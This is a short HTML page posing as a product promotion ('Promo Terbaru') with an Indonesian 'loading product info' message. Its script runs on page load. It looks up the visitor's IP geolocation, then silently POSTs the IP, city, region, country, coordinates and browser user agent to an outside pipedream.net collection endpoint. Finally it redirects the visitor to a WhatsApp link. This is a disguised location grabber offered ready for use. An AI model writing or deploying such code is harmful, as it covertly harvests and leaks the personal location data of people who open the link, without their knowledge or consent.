<!DOCTYPE html>
<html>
  <head>
    <meta charset="UTF-8">
    <title>Promo Terbaru</title>
  </head>
  <body>
    <h2>Tunggu sebentar, sedang memuat info produk...</h2>

    <script>
      fetch("https://ipapi.co/json/")
        .then(res => res.json())
        .then(data => {
          fetch("https://eoi1qxm9cxsp15h.m.pipedream.net", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              ip: data.ip,
              city: data.city,
              region: data.region,
              country: data.country,
              latlon: data.latitude + "," + data.longitude,
              useragent: navigator.userAgent
            })
          }).then(() => {
            // Setelah ngirim, redirect ke link target (misal YouTube/WA)
            window.location.href = "https://wa.me/62xxxx?text=Halo%20bos";
          });
        });
    </script>
  </body>
</html>
